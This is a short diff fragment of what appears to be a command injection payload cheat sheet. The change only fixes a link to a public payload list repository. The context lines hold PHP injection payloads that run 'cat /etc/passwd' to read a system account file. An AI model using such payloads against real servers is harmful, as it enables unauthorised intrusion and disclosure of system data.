@@ -104,4 +104,5 @@ system('cat /etc/passwd');
 &lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;
 </pre>
 Windows Commnads 
-<a href= https://github.com/payloadbox/command-injection-payload-list></a>
+
+<a href= https://github.com/payloadbox/command-injection-payload-list target="_blank">https://github.com/payloadbox/command-injection-payload-list</a>
